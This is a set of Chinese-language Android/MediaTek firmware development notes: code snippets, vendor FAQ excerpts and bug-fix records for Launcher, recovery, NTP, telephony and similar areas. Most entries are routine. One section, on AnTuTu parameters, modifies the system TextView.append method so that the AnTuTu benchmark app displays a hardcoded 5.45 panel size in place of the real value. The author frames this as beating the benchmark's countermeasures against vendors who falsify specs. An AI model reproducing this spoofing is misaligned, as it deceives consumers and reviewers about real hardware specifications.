        java.lang.reflect.Field fEditor = TextView.class.getDeclaredField("mEditor");
        fEditor.setAccessible(true);
        Object editor = fEditor.get(et);
        Class<?> clazz = editor.getClass();
        java.lang.reflect.Field fCursorDrawable = clazz.getDeclaredField("mCursorDrawable");
        fCursorDrawable.setAccessible(true);
        android.graphics.drawable.Drawable[]  drawables = new android.graphics.drawable.Drawable[1] ;
        drawables[0]  = et.getContext().getResources().getDrawable(mCursorDrawableRes);
        drawables[0] .setColorFilter(color, android.graphics.PorterDuff.Mode.SRC_IN);
        fCursorDrawable.set(editor, drawables);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

## [Snippet] 在某些ListView界面点击按键的时候会显示搜索框??

```text Java
listView.setTextFilterEnabled(false);
```

## [Snippet]  [Launcher] Launcher预置快捷方式shortcut

```text xml
launcher:uri 可以从 Launcher 数据库中获取

<shortcut
    launcher:uri="#Intent;action=android.intent.action.MAIN;launchFlags=0x10200000;component=com.cleanmaster.mguard/com.cleanmaster.processcleaner.ProcessCleanerActivity;end"
    launcher:icon="@drawable/ic_launcher_application"
    launcher:title="@string/jinshan_title" 
    launcher:screen=""
    launcher:x=""
    launcher:y=""/>
```

## [Snippet]  [Launcher] 通过代码创建快捷方式

```text Java
private void createShortcut(String title, String url) {
    Intent intent = new Intent(INSTALL_SHORTCUT);
    intent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Baidu");
    Intent shortcutIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
    long urlHash = url.hashCode();
    long uniqueId = (urlHash << 32) | shortcutIntent.hashCode();
    shortcutIntent.putExtra("com.android.browser.application_id", Long.toString(uniqueId));
    intent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
    intent.putExtra(Intent.EXTRA_SHORTCUT_ICON, BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher));
    sendBroadcast(intent);
}
```

## [Snippet] 设置 SeekBar 每一格的进度?

```text Java
mSlider.setKeyProgressIncrement(val);
```

## [Snippet] 隐藏AllApp中的应用图标??

```text Java
public void reorderApps() {
    ......
    for(int i = mApps.size() - 1; i > 0 ; i--){
        AppInfo appInfo = mApps.get(i);
        if("com.google.android.gms".equalsIgnoreCase(appInfo.getPackageName())){
            mApps.remove(appInfo);
        }
    }
}
```

## KK GMS无法通过网络定位??

```text Java
https://onlinesso.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ11643
1.系统对提供LocationProvider的应用需要进行申明,而KK GMS将NetworkLocation应用的功能集成到了GmsCore（Google Play Service）中，所以需要添加GmsCore的packageName进去：
framework/base/core/res/res/values/config.xml
<string-array name="config_locationProviderPackageNames" translatable="false">
    <!-- The standard AOSP fused location provider -->
    <item>com.android.location.fused</item>
    <!-- MTK add for GMS -->
    <item>com.google.android.location</item>
    <item>com.google.android.gms</item>
    <!-- MTK add end -->
</string-array>

2.GMS4.4_r3（包含r3）之后版本在满足1条件下依然可能存在无法使用网络定位功能，请继续按照如下修改操作：
WifiStateMachine.java (frameworks\base\wifi\java\android\net\wifi)
private void setScanResults() {
    ...
    if (bssid != null) {
    String ssid = (wifiSsid != null) ? wifiSsid.toString() : WifiSsid.NONE;
    String key = bssid + ssid;
    tsf = SystemClock.elapsedRealtimeNanos()/1000;//add this line
    ScanResult scanResult = mScanResultCache.get(key);
    ...
}
```

## 如何判断是否支持VOLTE??

```text Java
在如下文件中搜索 107(sfr)
ALPS-MP-N0.MP1-V1.0.2_SR6737T_65_N_modem/custom/service/nvram/custom_nvram_int_config.c
```

## android中图片的uri??

```text Java
"http://site.com/image.png" // from Web
"file:///mnt/sdcard/image.png" // from SD card
"file:///mnt/sdcard/video.mp4" // from SD card (video thumbnail)
"content://media/external/images/media/13" // from content provider
"content://media/external/video/media/13" // from content provider (video thumbnail)
"assets://image.png" // from assets
"drawable://" + R.drawable.img // from drawables (non-9patch images) //通常不用。
```

## [Snippet] 提高进程优先级的方法

```text Java
方法1：
找到这个进程对应的AndroidMannifest.xml文件，在其中添加属性『android:persistent="true"』， 这样可以将该进程设置为常驻内存进程，就可以降低被Kill的概率。以Acore进程为例， 在 /package/providers/ContactsProvider/AndroidMannifest.xml 文件中增加一行『android:persistent="true"』
具体修改示例如下：
android:label="@string/app_label"
android:icon="@drawable/app_icon"
android:allowBackup="false"
android:persistent="true" 

方法2： 
提高进程优先级 startForeground(1, new Notification()); 降低进程优先级 stopForeground(true); 
onStart() 方法中进行提高优先级操作，然后在onStop()方法中进行降低优先级操作
这个方法可以将对应AP的ADJ临时提高到2。
```

## [FAQ02683]  如何将一个app 设置为持久app, 不被low memory kill 关闭

```text
1. 将app 的manifest.xml 中的 application 中添加属性 android:persistent="true"
2. 对这个APP 使用platform 的签名
3. 放置在system/app 下面
注: 一个app 被设置为 persistent 后，将很难被low memory kill 杀掉(oom_adj=-12)，请在设置之前仔细确认是否必须，否则将浪费掉memory。
```

## [Snippet] 通过代码设置view的selector

```text Java
private StateListDrawable getStateDrawable(Context context, int normalId, int focusedId, int pressedId) {
    StateListDrawable stateListDrawable = new StateListDrawable();
    Drawable normalDrawable = normalId == -1 ? null : context.getResources().getDrawable(normalId);
    Drawable focusedDrawable = focusedId == -1 ? null : context.getResources().getDrawable(focusedId);
    Drawable pressedDrawable = pressedId == -1 ? null : context.getResources().getDrawable(pressedId);
    stateListDrawable.addState(new int[]  { android.R.attr.state_enabled, android.R.attr.state_focused }, focusedDrawable);
    stateListDrawable.addState(new int[]  { android.R.attr.state_enabled, android.R.attr.state_pressed }, pressedDrawable);
    stateListDrawable.addState(new int[]  { android.R.attr.state_focused }, focusedDrawable);
    stateListDrawable.addState(new int[]  { android.R.attr.state_pressed }, pressedDrawable);
    stateListDrawable.addState(new int[]  { android.R.attr.state_enabled }, normalDrawable);
    stateListDrawable.addState(new int[]  {}, normalDrawable);
    return stateListDrawable;
}

btn_state.setBackground(getStateDrawable(mContext, R.drawable.dialog_button_normal, R.drawable.dialog_button_focused, R.drawable.dialog_button_pressed));
```

## [Snippet] 状态栏上显示小时钟???

```text xml
<item
    android:id="@+id/clock"
    android:actionLayout="@layout/actionbar_layout_menu"
    android:showAsAction="always"
    android:title="时钟"/>

actionbar_layout_menu.xml
<AnalogClock xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" >
</AnalogClock>
```

## [FAQ15487]  如何让Launcher3支持横屏显示?

```text Java
N/M：
Launcher默认支持横屏显示，只需要按如下操作即可开启横屏显示：
桌面空白处长按→进入OverviewMode→点击设置→打开允许旋转的开关
 
L：
1.修改AndroidManifest.xml
<activity
android:name="com.android.launcher3.Launcher"
android:launchMode="singleTask"
android:clearTaskOnLaunch="true"
android:stateNotNeeded="true"
android:theme="@style/Theme"
android:configChanges="mcc|mnc"
android:windowSoftInputMode="adjustPan"
android:screenOrientation="sensor"> <!--modify to sensor -->

2.修改Utilities.java的isRotationEnabled方法
public static boolean isRotationEnabled(Context c) {
    return true;//直接返回true
}

此时旋转手机，Launcher会横竖屏切换。但hotseat会显示在屏幕的右方。如果要让hotseat显示在屏幕底部，可以按照如下步骤操作：

3.修改res/values/config.xml
<!--hotseat --> 
<bool name="hotseat_transpose_layout_with_orientation">false</bool> <!--改为false-->

4.修改Hotseat.java的onFinishInflate方法
@Override
protected void onFinishInflate() {
    super.onFinishInflate();
    LauncherAppState app = LauncherAppState.getInstance();
    DeviceProfile grid = app.getDynamicGrid().getDeviceProfile();
    mAllAppsButtonRank = grid.hotseatAllAppsRank;
    mContent = (CellLayout) findViewById(R.id.layout);
    if (grid.isLandscape && !grid.isLargeTablet()) {
        mContent.setGridSize((int) grid.numHotseatIcons, 1); //modify
    } else {
        mContent.setGridSize((int) grid.numHotseatIcons, 1);
    }
    mContent.setIsHotseat(true);
    Log.i(TAG, "onFinishInflate,(int) grid.numHotseatIcons: " + (int) grid.numHotseatIcons);
    resetLayout();
}
```

## [recovery] 修改recovery界面的显示问题

```text
1.修改 Makefile 中的 recovery 字体资源
M:alps/build/make/core/Makefile
-recovery_font := $(call include-path-for, recovery)/fonts/12x22.png
+recovery_font := $(call include-path-for, recovery)/fonts/8x14.png

2.添加 8*14 的资源
A:alps/bootable/recovery/fonts/8x14.png
A:alps/bootable/recovery/minui/font_8x14.h

3.添加 ldpi 分辨率的 recovery 动画资源
A:alps/bootable/recovery/res-ldpi/images/*

4.上传记录
http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commit;h=97d43c37c7a211fd1e768c4ae1c93e3bf6f3ce18
```

## [Snippet] 根据霍尔器件的状态发送AT指令来控制 SAR 值功率是否回退

```text Java
//1.在 EngineerMode 中添加一个 ATService 来发送AT命令
String cdmaSlotIdStr = SystemProperties.get("persist.radio.cdma_slot", "1");
int cdmaSlotId = Integer.parseInt(cdmaSlotIdStr) - 1;
Phone sarPhone = null;
if (TelephonyManager.getDefault().getPhoneCount() > 1) {
    try {
        sarPhone = PhoneFactory.getPhone(cdmaSlotId);
    } catch (Exception e) {
        return;
    }
} else {
    sarPhone = PhoneFactory.getDefaultPhone();
}
String[]  sarStr = new String[2] ;
sarStr[0]  = shutDown ? "AT+ERFIDX=1,0" : "AT+ERFIDX=1,1";    //对应的AT命令，盒盖的时候发送 AT+ERFIDX=1,0 回退功率，开盖的时候发送 AT+ERFIDX=1,1 不回退功率
sarStr[1]  = "+ERFIDX";
if (sarPhone != null) {
    sarPhone.invokeOemRilRequestStrings(sarStr, mMessageHandler.obtainMessage(EVENT_AT_CMD));   //发送命令
}

//2.在 PhoneWindowManager.java 中通过 AIDL 绑定 EngineerMode 中的 ATService

//3.在 PhoneWindowManager.java 的 notifyLidSwitchChanged(long whenNanos, boolean lidOpen) 方法中的 lidOpen 就是霍尔器件的状态
if (atService == null) {
    bindATService(mContext);
}
if (null != atService){
    try {
        atService.sendATCommand(lidOpen);
    } catch (RemoteException e) {
        e.printStackTrace();
    }
}
4.遇到的问题
a.为什么在 EngineerMode 中添加 ATService，而不是在别的应用中?

因为 Phone 这个类只能在 phone 进程中使用，而 EngineerMode 中有 android:sharedUserId="android.uid.phone"

b.开机第一次盒盖没有发送 AT 命令?

因为第一次绑定 ATService 的时候 phone 进程可能没有启动，绑定失败
http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commit;h=518e1a0088cfb63c262926f69f537398da78a73e

c.开机第一次盒盖没有发送正确的 AT 命令

因为第一次绑定的时候需要一定的时间，绑定成功了之后实际的霍尔器件的状态已经发生了改变，通过一个局部变量 private int mLidOpenState = 0; 来保存第一次绑定时候的霍尔器件的状态
http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commit;h=fb0b93a7cc02d2b4652859510ed58aefe6477a24

d.如何查看对应 AT 命令是否发送成功，是否发送正确?

adb logcat -b radio > log.txt
在 log 中搜索 ERFIDX 附近的 log, 如果有 OK 则表示已经发送成功

5.上传记录
http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commit;h=54ba3a5018d97814ffe21bd9df4c5ca238baf3b9
http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commit;h=c6e5472f36bdaea5230f48b3f5450ff1cdd2b64c
http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commit;h=518e1a0088cfb63c262926f69f537398da78a73e
http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commit;h=fb0b93a7cc02d2b4652859510ed58aefe6477a24
```

## [log] 39oGo无法打开 modemlog

```text
M:sagereal/mk/VQ288_common/k39tv1_bsp_512.mk
MTK_DYNAMIC_CCB_BUFFER_GEAR_ID =

M:sagereal/mk/VQ288_common/ProjectConfig.mk
MTK_DYNAMIC_CCB_BUFFER_GEAR_ID =
```

## [log] EngineerMode 中没有 batterylog

```text Java
private static final String[]  KEY_REMOVE_ARRAY = {"de_sense", "display", "battery_log", //只需要去掉 battery_log 就不会消失了
```

## [Snippet] 通过 "Outline" tag 来控制View是否高对比度显示

```text Java
Object mViewTag = getTag();
if (mViewTag instanceof String) {
    String mViewTagStr = (String)mViewTag;
    if ("Outline".equalsIgnoreCase(mViewTagStr)) {
        canvas.setHighContrastText(true);   //设置高对比度显示
    }
}
```

## [bug] 39oGo TPLink 中 FaceBook 图标显示白块

<http://192.168.3.79:8084/gitweb?p=O1_MP1/alps-release-o1.mp1-default.git;a=commitdiff;h=24fd8a317d43a1c618a26a58101927139164c750>
``M:alps/frameworks/base/core/java/android/app/Notification.java``

```text Java
private void processSmallIconColor(Icon smallIcon, RemoteViews contentView, boolean ambient) {
-            boolean colorable = !isLegacy() || getColorUtil().isGrayscaleIcon(mContext, smallIcon);
+            boolean colorable = getColorUtil().isGrayscaleIcon(mContext, smallIcon);
```

M:alps/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/ExpandableNotificationRow.java

```text Java
-        boolean colorize = !isPreL || NotificationUtils.isGrayscale(expandedIcon,
+        boolean colorize = NotificationUtils.isGrayscale(expandedIcon, NotificationColorUtil.getInstance(mContext));
```

M:alps/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/phone/NotificationIconAreaController.java

```text Java
-        boolean colorize = !isPreL || NotificationUtils.isGrayscale(v, mNotificationColorUtil);
+        boolean colorize = NotificationUtils.isGrayscale(v, mNotificationColorUtil);
```

## 强制修改 39oGo TPLink 中安兔兔跑分中的参数

一开始的时候在 setText() 方法中作的修改，但是在最新的antutu中不管用了，反编译发现最新的antutu中不再使用 setText() 来设置字符串了，而是把字符串分割成了单个的字符再append()到TextView中，应该是发现有太多的厂商强行修改这些参数，然而这并难不倒我们，修改方法如下。

```text Java
public void append(CharSequence text, int start, int end) {
    if (!(mText instanceof Editable)) {
        setText(mText, BufferType.EDITABLE);
    }

    ((Editable) mText).append(text, start, end);

    //modified begin
    if (getContext() != null) {
        String packageName = getContext().getPackageName();
        if ("com.antutu.ABenchMark".equalsIgnoreCase(packageName)) {
            int textViewId = getContext().getResources().getIdentifier("item_hardware_text_desc", "id", "com.antutu.ABenchMark");
            if (textViewId == getId()) {
                String sizeStr = getContext().getResources().getString(getContext().getResources().getIdentifier("size_panel", "string", "com.antutu.ABenchMark"));
                if (mText.toString().contains(sizeStr)) {
                    mText = "5.45 " + sizeStr;
                    setText(mText);
                }
            }
        }
    }
    //modified end

    if (mAutoLinkMask != 0) {
        boolean linksWereAdded = Linkify.addLinks((Spannable) mText, mAutoLinkMask);
        // Do not change the movement method for text that support text selection as it
        // would prevent an arbitrary cursor displacement.
        if (linksWereAdded && mLinksClickable && !textCanBeSelected()) {
            setMovementMethod(LinkMovementMethod.getInstance());
        }
    }
}
```

## LCA项目，MTK_PRODUCT_LOCALES中"-sw600dp -sw720dp"的含义

```text
LCA项目中，为给img瘦身，若MTK_PRODUCT_LOCALES中定义了"-sw600dp -sw720dp"，则在MTK_LCA_ROM_OPTIMIZE为yes，且MTK_TABLET_PLATFORM为no的前提情况下，那些为Tablet（大屏幕设备）准备的资源（含有sw600dp，sw720dp限定符的resource目录）将不会被build到apk中。
 
比如：
定义MTK_PRODUCT_LOCALES=zh_CN en_US zh_TW hdpi -sw600dp -sw720dp
假设某一app的res目录下，关于drawable，含有下面的资源目录：
drawable
drawable-hdpi
drawable-land-hdpi
drawable-land-mdpi
drawable-land-xhdpi
drawable-mdpi
drawable-nodpi
drawable-sw600dp-hdpi
drawable-sw600dp-mdpi
drawable-sw600dp-xhdpi
drawable-sw720dp-hdpi
drawable-sw720dp-mdpi
drawable-sw720dp-xhdpi
drawable-xhdpi

那么，最终编译过后，apk中将只含有下面这些目录：
drawable
drawable-hdpi
drawable-land-hdpi
drawable-nodpi

这样将大大减小img的大小，达到为project瘦身的目的。

aapt2 link 怎么使用 --preferred-density 参数???

device/mediatek/common/aapt_config.mk 中的参数好像不起作用??

1. 在L0(android 5.0)及之前的AOSP版本：
在device\mediatek\$(proj_name)\full_$(proj_name).mk设置
PRODUCT_AAPT_CONFIG := hdpi xhdpi xxhdpi 
指定project支持的density.

2. 在L1和M0(android 5.1之后版本):
系统会通过屏幕height和width来算出project默认应该支持的density:
device/mediatek/common/aapt/aapt_config.mk

如果该默认值不符合您的要求，可以在device\mediatek\$(proj_name)\full_$(proj_name).mk中添加如下：
PRODUCT_AAPT_PREF_CONFIG := xhdpi
AAPT会将xhdpi的资源打包。如果此时找不到xhdpi资源, AAPT会去找其他分辨率。这种情况下，为避免资源缺失，至少会包一种类型的资源进来。所以这种case下，可能会发生系统编译进多种其他分辨率资源，导致rom变大的情况。

注意1：PRODUCT_AAPT_PREF_CONFIG只能设置一种dpi。不能设置为PRODUCT_AAPT_PREF_CONFIG := xhdpi xxhdpi 这种错误形式。
注意2: PRODUCT_AAPT_CONFIG在L1上已经失效.
```

## [FAQ13924]  Lollipop之后的新版本上，如何使AAPT将最佳匹配资源编译打包

```text
1. 在L0(android 5.0)及之前的AOSP版本：
在device\mediatek\$(proj_name)\full_$(proj_name).mk设置
PRODUCT_AAPT_CONFIG := hdpi xhdpi xxhdpi 
指定project支持的density.

2. 在L1和M0(android 5.1之后版本):
系统会通过屏幕height和width来算出project默认应该支持的density:
device/mediatek/common/aapt/aapt_config.mk

如果该默认值不符合您的要求，可以在device\mediatek\$(proj_name)\full_$(proj_name).mk中添加如下：
PRODUCT_AAPT_PREF_CONFIG := xhdpi
AAPT会将xhdpi的资源打包。如果此时找不到xhdpi资源, AAPT会去找其他分辨率。这种情况下，为避免资源缺失，至少会包一种类型的资源进来。所以这种case下，可能会发生系统编译进多种其他分辨率资源，导致rom变大的情况。

注意1: PRODUCT_AAPT_PREF_CONFIG只能设置一种dpi。不能设置为PRODUCT_AAPT_PREF_CONFIG := xhdpi  xxhdpi 这种错误形式。
注意2: PRODUCT_AAPT_CONFIG在L1上已经失效.
```

## [Snippet] 检测设备是否root

```text Java
public boolean isRoot() {
    boolean root = false;
    try {
        if(!("eng".equals(SystemProperties.get("ro.build.type")))){
            if ((!new File("/system/bin/su").exists()) && (!new File("/system/xbin/su").exists())) {
                root = false;
            }else {
                root = true;
            }
        }
    } catch (Exception e) {
    }
    return root;
}
```

## 默认语言不会随着sim卡变化而变化

```text Java
alps/vendor/mediatek/proprietary/packages/services/Telephony/src/com/android/phone/PhoneInterfaceManager.java
-        final Locale mccLocale = MccTable.getLocaleFromMcc(mPhone.getContext(), mcc, simLanguage);
+        //final Locale mccLocale = MccTable.getLocaleFromMcc(mPhone.getContext(), mcc, simLanguage);
+        final Locale mccLocale = null;



根据 SIM 卡的 mccmnc 设置语言
MccTable.java updateMccMncConfiguration() 中添加
setLocaleFromMccIfNeeded(context, mcc);     //有些平台没有这个方法，需要自行添加实现部分的代码
```

## [Snippet] P go 上关机对话框上会有两种 item 的颜色

```text
vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/globalactions/GlobalActionsDialog.java

MyAdapter
public View getView(int position, View convertView, ViewGroup parent) {
    Action action = getItem(position);
    View view = action.create(mContext, convertView, parent, LayoutInflater.from(mContext));
    // Everything but screenshot, the last item, gets white background.
    if (position == getCount() - 1) {
        //HardwareUiLayout.get(parent).setDivisionView(view);   //这里会把最后一项变成其他颜色，去掉这一行代码就可以
    }
    return view;
}
```

## [bug] 开机后发现Home和Menu功能不正常

```text Java
原因是开机向导过程中意外关机导致 Settings.Global.DEVICE_PROVISIONED 这个值没有写入到数据库中
M:frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java文件中的setEnabledSetting方法中   ----->redmine62528
try {
    if(packageName.equals("com.google.android.setupwizard") && !(newState == COMPONENT_ENABLED_STATE_ENABLED||newState == COMPONENT_ENABLED_STATE_DEFAULT)) {
        if (android.provider.Settings.Global.getInt(mContext.getContentResolver(),android.provider.Settings.Global.DEVICE_PROVISIONED, 0) == 0) {
            android.provider.Settings.Global.putInt(mContext.getContentResolver(), android.provider.Settings.Global.DEVICE_PROVISIONED, 1);
        }
    }
} catch (Exception e) {
    e.printStackTrace();
}

adb shell settings put global device_provisioned 0
adb shell settings get global device_provisioned
```

## [Snippet] 在 app 中使用自定义字体

```text Java
//package/apps/calculate/里面新建assets/fonts文件夹，然后把那个.otf/.ttf文件放到里面
setTypeface(Typeface.createFromAsset(context.getAssets(), "fonts/HelveticaNeueLTStd-UltLt.otf"));
```

## SIM卡联系人数量显示的与实际不符

```text
SIM卡联系人数量显示的与实际不符（SIM卡中有很多联系人，选择删除所有SIM卡联系人，删除过程中下拉状态栏，点击“联系人”正在运行，选择强制停止后返回联系人。sim卡中联系人的数量没有变，重启后才会减少。）
1、sim卡中的联系人删除原理：删除过程中首先删除的是sim卡里的数据，然后去删除数据库的数据，如果在删除过程中强制停止的话，可能就只删除了sim卡里面的数据，而还没有删除掉数据库的数据，然后再打开联系人的时候，它会根据数据库的数据进行更新，如果数据库没被 删除掉的话，联系人的数据也就不会变了，因此出现了上述的bug情况。
2、手机中联系人删除原理：删除过程中是直接删除数据库的数据，不会出现上述情况。
3、手机重启联系人会更新的原理：手机重启后，会先把数据库中关于sim卡的数据进行删除，然后再从sim卡中把那些号码导入到数据库，这样数据库的数据就会跟sim卡的数据一样，然后再从数据库读取数据显示出来就会是最新的。
4、无法修改原因：我通过调试和使用MTKlog抓取log的方法，在删除联系人的地方发现了有关它删除sim卡联系人的方法，然后进行修改，最终发现更新功能是能实现，但是删除的速度会减慢，本来是100条删除一次，现在变成每1条删除一次，这样会严重影响效率，而且该bug的操作我认为是非法操作，手机已经提醒如此操作会使数据发生错乱，综合上面种种原因，我认为该bug不用修改。
5、删除sim卡联系人数据具体方法：trunk/Packages/apps/Contacts/src/com/mediatek/contacts/list/DeleteProcessor.java中的runInternal()方法中。
```

## 经常会出现开机logo显示正确，而关机充电图标显示乱

```text
原因：
1、我们少修改了一个文件mediatek/custom/common/lk/include/target/cust_display.h)以tecno的UP07为例，config文件中BOOT_LOGO=fwvga_tecno_d7 
tecnoD7项目是FWVGA的分辨率，因此需要在cust_display.h的FWVGA最后添加一句
#elif defined(FWVGA) || defined(CU_FWVGA) || defined(CMCC_FWVGA) || defined(FWVGA_TECNO_D7) (这个的分辨率是fwvga 480*854，所以每个项目都要到projectConfig.mk文件中找到手机对应的分辨率)
如果你的分辨率是320*480的话，就要在该文件中的#elif defined(HVGA) || defined(CU_HVGA) || defined(CMCC_HVGA) || defined(CT_HVGA) || defined(HVGA_UP11)加了，可以直接搜索分辨率(320*480)
注：BOOT_LOGO中定义的是小写的，而cust_display.h中需要写成大写的
2、你要去看mediatek/custom/common/lk/logo中的图片的分辨率是否正确！
```

## FeatureOption.java 的位置

```text
out/target/product/mq16_h451_t3_p/obj/JAVA_LIBRARIES/mediatek-common_intermediates/FeatureOption.java（看宏编译后生成的是什么就再java文件中调用什么，注意有些宏再projectConfig.mk文件中的宏名字和featrueoption产生的宏名字不一样，如果我们要使用这个宏的话以编后再featrueoption生成的为准）
```

## [默认值] usb默认联接用Media device(MTP)而不用USB Storage

```text
方法：[FAQ04464]  [USB] 如何修改USB连接后的默认功能
/build/core/main.mk 中搜索 ADDITIONAL_DEFAULT_PROPERTIES += persist.sys.usb.config，会发现默认连接值用哪个可以用宏控制，MTK_MASS_STORAGE
```

## [默认值] 短信转彩信条数

```text
短信字数到达一定数字短信变成彩信（redmine 6837）
SAGEREAL_SMSTOMMS_LIMIT，这个宏要打开!
该功能修改再MmsConfig.java文件里面！

1.短信变为彩信????
解决：
packages/apps/Mms/res/xml/mms_config.xml
<!-- Maximum number of SMS message segments in a long text message before converting the SMS message to an MMS message. -->
<int name="smsToMmsTextThreshold">7</int>
```

## [默认值] 当用USB连接的时候，USB名称修改

```text
1、打开/system/vold/Fat.cpp，然后 if(isInttrunkernalSd)下面把要修改的名字修改了！（相当于我的电脑上显示出来的名称）
2、是按照客户需求名称汇总表20131105文件修改！（这个是虚拟机上面的设备-->分配设备）
```

## [FAQ10350]  如何修改AllApp Button的位置

```text
1、/packages/apps/Launcher2/res/xml/default_workspace.xml中修改除了app button以外按钮的顺序，就是Hotseat
然后/packages/apps/Launcher2/src/com/android/launcher2/Hotseat.java中有一个Allapp Button的默认位置，是通过/packages/apps/Launcher2/res/values/config.xml中的hotseat_all_apps_index值设置的，如果你要把all button的位置也修改了，必须要把这个hotseat_all_apps_index默认值给修改了,当然那个默认值修改后你要把default_workspace.xml中的hotseat的其他图标的位置做相应的修改！
2、/packages/apps/Launcher3:
DynamicGrid.java文件
hotseatAllAppsRank = (int) (numColumns/2); //默认是列数除以2取整，可以设置为需要的值,(比如说(int) (numColumns/2)-1就是相当与把Allapp Button向左移动了一位，当然在default_workspace.xml中要把原来在Allapp Button左边的那个应用的位置给让出来！)
```

## [NTP] 选择使用网络自动更新时间后，时间不准确

```text
frameworks/base/services/java/com/android/server/NetworkTimeUpdateService.java
进入文件，然后把"203.160.128.59","2.android.pool.ntp.org","time-a.nist.gov"中的"203.160.128.59"注销掉，因为这个通过这个服务器获得的时间是有问题，导致了这个时间不准确！
```

## [NTP] 修改自动对时服务器

```text
How to change server address?
There are two ways:
1. change Android default server address. Just replace this value that in "/frameworks/base/core/res/res/values/config.xml"with your own server address.
2. Add your server in NetworkTimeUpdateService.java. use ((NtpTrustedTime) mTime).setServer(custom_server) to set custom NTP server before call mTime.forceRefresh(). Then 
NtpTrustedTime will connect to custom_server to update time.

How to verify modify?
initialization:
Make sure handset can access internet, enter settings -> Date & time, enable Automatic time from network. Disable Automatic time zone.

test:
reboot phone, check mainlog/syslog:

07-12 08:56:09.770370   943   943 D NtpTrustedTime: getServer:[time.android.com]    // this address should be custom server 
07-12 08:57:07.184321   943  1172 D NetworkTimeUpdateService: New default network 100; checking time.
07-12 08:57:07.184816   943  1172 D NetworkTimeUpdateService: onPollNetworkTime start
07-12 08:57:07.191897   943  1172 D NetworkTimeUpdateService: Stale NTP fix; forcing refresh
07-12 08:57:07.192420   943  1172 D NetworkTimeUpdateService: mTryAgainCounter = 0;mNtpServers.size() = 3;index = 0;mNtpServers = time.android.com
07-12 08:57:07.192835   943  1172 D NtpTrustedTime: setServer:[time.android.com] 
07-12 08:57:07.555810   943  1172 D SntpClient: round trip: 84ms, clock offset: 200ms  // means success
```

## [6509] (情景模式)勾选触摸提示音，每次约5s后第一次触摸时触摸音较小，之后触摸声音会变大一点

```text
custom/common/kernel/sound/amp_aw8145/yusu_android_speaker.c
然后把 SPK_WARM_UP_TIME 的数值修改！
```

## [6410] (通话记录)通话记录详情界面进入到电话本记录后，按返回键退出的不是上一个界面

```text
packages/apps/Dialer/src/com/android/dialer/CallDetailActivity.java
把 onPostExecute() 中的 mainActionIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP)注销掉！
```

## [11203]  [Mms] pls remove the calendar option

```text
packages/apps/Mms/src/com/android/mms/util/MessageConsts.java
把calendar的项给去掉，然后进入 packages/apps/Mms/res/values/mtk_arrays.xml 把calendar的项去掉

packages/apps/Mms/src/com/mediatek/ipmsg/ui/SharePanel.java
把多余的一页去掉！
```

## [FAQ02892] 紧急号码的管理及客制化方法

```text
思想大义：framework/base/telephony/java/android/telephony/PhoneNumberUtils.java 中的 isEmergencyNumber 为 true，isSpecialEmergencyNumber 为 false
1、不插卡时：framework/base/telephony/java/android/telephony/PhoneNumberUtils.java 中的 isEmergencyNumber(String number) 方法中是有插卡和不插卡的两个方法(可以直接抓取log看，一般就能看出有卡和无卡情况下怎么修改)
isEmergencyNumber(String number)方法中当int eccNo = 9;
String[]  emergencyNumList = {"112", "911", "000", "08", "110", "118", "119", "999", "123"}中把要加的号码加上去（一般再SIM4的判断后面是无sim情况的）
2、插卡时：打开 mediatek/frameworks/base/op/java/com/mediatek/op/telephony/PhoneNumberExt.java，有 isCustomizedEmergencyNumber(String number, String plusNumber, String numberPlus) 方法，然后就可以在这里加上你要定制的紧急拨号号码！（特殊情况：如果是去掉911号码要在PhoneNumberUtils中判断sim1的时候（有注释的），直接在判断方法中把911去除）
ps：编译 mediatek/frameworks/base/op/java/com/mediatek/op/telephony/PhoneNumberExt.java 该文件的时候可以编译 ./mk -t mm mediatek/frameworks/base

ps:在插入卡的时候会发现在默认112、911为紧急拨号，如果要去除的话，要在 frameworks/opt/telephony/src/java/com/android/internal/telephony/uicc/SIMRecords.java 文件中handleMessage(Message msg)方法中 case EVENT_GET_SIM_ECC_DONE和case EVENT_GET_USIM_ECC_DONE下有个mEfEcc = "112,911"

[Android Version] 
Android 5.0/5.1 (L)
Android 6.0 (M)
Android 7.0(N)
Android 8.0(O)

[DESCRIPTION] 
L及之后的版本紧急号码Customer的部分改成了在XML文件中来配置，文件的路径：
alps/vendor/mediatek/proprietary/external/EccList

EccList文件夹中会包含ecc_list.xml，以及与运营商有关的ecc_list_OP01.xml、ecc_list_OPXX.xml等对应文件，此外还包括一个EccList.mk的Makefile。实际运行中会根据Makefile文件中的定义匹配对应的XML文件作为判断是否是紧急号码的来源。

下面是ecc_list.xml文件中的内容：

N及之后的版本ecc_list.xml 文件不变，但是有加上PLMN的配置， 也就是可以按照运营商

26    <!-- Add for China CTA -->
27    <EccEntry Ecc="110" Category="0" Condition="2" Plmn = "460 FFF" />
28    <EccEntry Ecc="119" Category="0" Condition="2" Plmn = "460 FFF" />
29    <EccEntry Ecc="120" Category="0" Condition="2" Plmn = "460 FFF" />
30    <EccEntry Ecc="122" Category="0" Condition="2" Plmn = "460 FFF" />
31
32    <!-- Add for Malaysis Digi operator -->
33    <EccEntry Ecc="999" Category="0" Condition="1" Plmn = "502 FFF" />
*说明：

一 、添加号码请注意Condition的配置，根据需求来选择对应的值。
